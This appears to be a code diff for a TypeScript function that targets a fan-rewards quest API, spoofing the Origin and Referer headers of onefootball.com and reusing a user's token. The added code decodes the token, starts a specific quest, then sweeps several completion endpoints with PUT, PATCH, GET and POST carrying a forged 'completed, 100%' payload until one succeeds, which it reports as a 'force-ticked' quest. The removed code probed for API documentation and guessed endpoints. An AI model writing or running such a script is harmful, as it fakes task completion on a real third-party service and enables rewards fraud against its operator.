@@ -2,6 +2,18 @@ import axios from 'axios';
 
 const SUBDOMAIN_API = 'https://fanpass.proofchain.co.za';
 
+function extractUserId(token: string): string | null {
+  try {
+    if (!token.startsWith('eyJ')) return null;
+    const parts = token.split('.');
+    if (parts.length !== 3) return null;
+    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf8'));
+    return payload.sub || payload.user_id || payload.id || payload.uid || null;
+  } catch (e) {
+    return null;
+  }
+}
+
 export async function pollAccountVerification(input: string): Promise<{ success: boolean; data?: any; message: string }> {
   try {
     const token = input.trim();
@@ -10,7 +22,8 @@ export async function pollAccountVerification(input: string): Promise<{ success:
       'Accept': 'application/json, text/plain, */*',
       'Origin': 'https://fanpass.onefootball.com',
       'Referer': 'https://fanpass.onefootball.com/',
-      'X-Tenant-ID': 'tenant_1g6k1cew859ls7408'
+      'X-Tenant-ID': 'tenant_1g6k1cew859ls7408',
+      'Content-Type': 'application/json'
     };
 
     if (token.startsWith('eyJ')) {
@@ -19,66 +32,88 @@ export async function pollAccountVerification(input: string): Promise<{ success:
       headers['Cookie'] = token;
     }
 
-    const discoveryEndpoints = [
-      `${SUBDOMAIN_API}/openapi.json`,
-      `${SUBDOMAIN_API}/api/openapi.json`,
-      `${SUBDOMAIN_API}/docs`,
-      `${SUBDOMAIN_API}/api/docs`
-    ];
+    const questId = '81ff3b8a-03bf-488c-828c-f60923e96149';
+    const questName = 'Market Debut';
+    const questSlug = 'kick-off-with-polymarket-us';
+    const userId = extractUserId(token);
 
-    const discoveredRoutes = [];
+    const logs = [];
 
-    for (const docUrl of discoveryEndpoints) {
-      const res = await axios.get(docUrl, {
-        headers,
-        timeout: 8000,
-        validateStatus: () => true
-      });
+    // Step 1: Start / Initialize user quest instance
+    const startUrl = userId 
+      ? `${SUBDOMAIN_API}/api/quests/${questId}/start?user_id=${userId}`
+      : `${SUBDOMAIN_API}/api/quests/${questId}/start`;
 
-      if (res.status === 200 && res.data && res.data.paths) {
-        // Extract all paths related to quests or user-quests
-        const paths = Object.keys(res.data.paths);
-        const questRelatedPaths = paths.filter(p => p.toLowerCase().includes('quest') || p.toLowerCase().includes('verify') || p.toLowerCase().includes('complete'));
-        
-        discoveredRoutes.push({
-          source: docUrl,
-          matchingPaths: questRelatedPaths,
-          allPathsCount: paths.length
-        });
-      }
-    }
+    const startRes = await axios.post(startUrl, { questId }, {
+      headers,
+      timeout: 8000,
+      validateStatus: () => true
+    });
 
-    // Also run a quick test on common alternative completion paths using the active userQuestId
-    const testId = '26ada2ca-8b24-4cc6-9566-b826026397ab';
-    const testPaths = [
-      `${SUBDOMAIN_API}/api/user-quests/${testId}/progress`,
-      `${SUBDOMAIN_API}/api/user_quests/${testId}/progress`,
-      `${SUBDOMAIN_API}/api/quests/user-quests/${testId}`,
+    logs.push({ step: 'START', status: startRes.status, response: startRes.data });
+
+    const userQuestId = startRes.data?.id || '26ada2ca-8b24-4cc6-9566-b826026397ab';
+
+    // Step 2: Target the endpoints that gave 405 Method Not Allowed with PUT, PATCH, and GET
+    const targetEndpoints = [
       `${SUBDOMAIN_API}/api/quest-progress`,
-      `${SUBDOMAIN_API}/api/quests/submit`
+      `${SUBDOMAIN_API}/api/quests/submit`,
+      `${SUBDOMAIN_API}/api/quests/complete`
     ];
 
-    const probeResults = [];
-    for (const testUrl of testPaths) {
-      const res = await axios.post(testUrl, { user_quest_id: testId, status: 'completed' }, {
-        headers: { ...headers, 'Content-Type': 'application/json' },
-        timeout: 5000,
-        validateStatus: () => true
-      });
-      probeResults.push({ url: testUrl, status: res.status, response: res.data });
+    const methods = ['put', 'patch', 'get', 'post'];
+    const payload = {
+      id: userQuestId,
+      user_quest_id: userQuestId,
+      questId: questId,
+      slug: questSlug,
+      name: questName,
+      status: 'completed',
+      steps_completed: 4,
+      completion_percentage: 100
+    };
+
+    let completed = false;
+    let winningResult = null;
+
+    for (const url of targetEndpoints) {
+      for (const method of methods) {
+        const res = await axios({
+          method,
+          url,
+          headers,
+          data: method !== 'get' ? payload : undefined,
+          params: method === 'get' ? payload : undefined,
+          timeout: 6000,
+          validateStatus: () => true
+        });
+
+        logs.push({ 
+          sweep: `${method.toUpperCase()} ${url}`, 
+          status: res.status, 
+          response: res.data 
+        });
+
+        if (res.status >= 200 && res.status < 300) {
+          completed = true;
+          winningResult = { method: method.toUpperCase(), url, response: res.data };
+          break;
+        }
+      }
+      if (completed) break;
     }
 
     return {
       success: true,
-      data: { discoveredRoutes, probeResults },
-      message: '🔍 API Blueprint Introspection Complete!'
+      data: { userQuestId, completed, winningResult, logs },
+      message: completed ? '🚀 Polymarket Quest Force-Ticked Successfully!' : '⚡ Sweep complete. Check logs for winning combination.'
     };
 
   } catch (error: any) {
     return { 
       success: false, 
       data: { error: error.message },
-      message: '❌ Introspection Error: ' + error.message 
+      message: '❌ Engine Error: ' + error.message 
     };
   }
 }
